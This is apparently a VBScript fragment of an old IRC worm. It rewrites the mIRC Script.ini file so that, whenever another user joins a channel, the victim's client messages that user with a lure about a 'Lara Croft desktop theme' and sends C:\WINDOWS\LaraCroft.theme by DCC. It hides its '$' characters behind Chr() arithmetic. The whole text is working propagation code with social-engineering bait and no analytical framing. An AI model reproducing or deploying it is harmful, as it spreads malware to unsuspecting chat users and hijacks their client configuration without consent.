Dim fso, f 
Set fso = CreateObject("Scripting.FileSystemObject") 
Set f = fso.OpenTextFile("C:\mirc\Script.ini",2, True) 
f.WriteLine "[Script]" 
f.Write "n0=on 1:JOIN:#:if ( " 
f.Write Chr((26)+10) 
f.Write "me != " 
f.Write Chr((26)+10) 
f.Write "nick ) { /msg " 
f.Write Chr((26)+10) 
f.Write "Nick Hi there!! Check out tiz Lara Croft desktop theme: Click on the Preview screen saver button, its the best i've ever seen | /" 
f.Write "dcc send " 
f.Write Chr((26)+10) 
f.Write "nick C:\WINDOWS\LaraCroft.theme }" 
